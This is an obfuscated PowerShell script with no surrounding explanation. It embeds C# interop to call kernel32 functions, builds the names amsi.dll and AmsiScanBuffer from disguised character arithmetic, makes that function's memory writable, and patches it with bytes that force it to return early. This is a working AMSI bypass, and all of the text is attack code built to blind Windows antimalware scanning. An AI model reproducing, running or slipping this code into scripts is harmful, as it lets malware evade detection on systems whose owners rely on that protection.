$fqHrvojBRVQvhYfu = @"
using System;
using System.Runtime.InteropServices;
public class fqHrvojBRVQvhYfu {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Oo5aTs9rQob9W, string nzlOBMTete61OSzz6M);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr WkGv, UIntPtr ZhAwl, uint Srbwh60YqEQObNSVCk6M, out uint OUlFW7FsG92d_);
}
"@

Add-Type $fqHrvojBRVQvhYfu

$DznB = [fqHrvojBRVQvhYfu]::LoadLibrary("$([ChAr](97)+[ChaR]([ByTe]0x6d)+[CHaR]([bytE]0x73)+[cHaR](105*56/56)+[ChaR]([byTe]0x2e)+[char](100*9/9)+[ChAR](108)+[CHAr]([ByTe]0x6c))")
$INQFa = [fqHrvojBRVQvhYfu]::GetProcAddress($DznB, "$(('ÁmsîSc'+'ãnBùff'+'êr').NoRMAliZe([cHAr]([bYTe]0x46)+[cHAR](85+26)+[ChAr]([Byte]0x72)+[chAR]([BYTe]0x6d)+[CHaR](68*52/52)) -replace [ChAr](92+18-18)+[CHar](112+91-91)+[chAr](123+83-83)+[char](77)+[chAR]([BYtE]0x6e)+[ChAR]([Byte]0x7d))")
$p = 0
[fqHrvojBRVQvhYfu]::VirtualProtect($INQFa, [uint32]5, 0x40, [ref]$p)
$owq5945 = "0xB8"
$pqST8 = "0x57"
$pFK9G = "0x00"
$JpbfdKH01KrJESUEgO = "0x07"
$tg2RQarQEF__h1D = "0x80"
$COgbrWM = "0xC3"
$AGoMUDFYQ = [Byte[]] ($owq5945,$pqST8,$pFK9G,$JpbfdKH01KrJESUEgO,+$tg2RQarQEF__h1D,+$COgbrWM)
[System.Runtime.InteropServices.Marshal]::Copy($AGoMUDFYQ, 0, $INQFa, 6)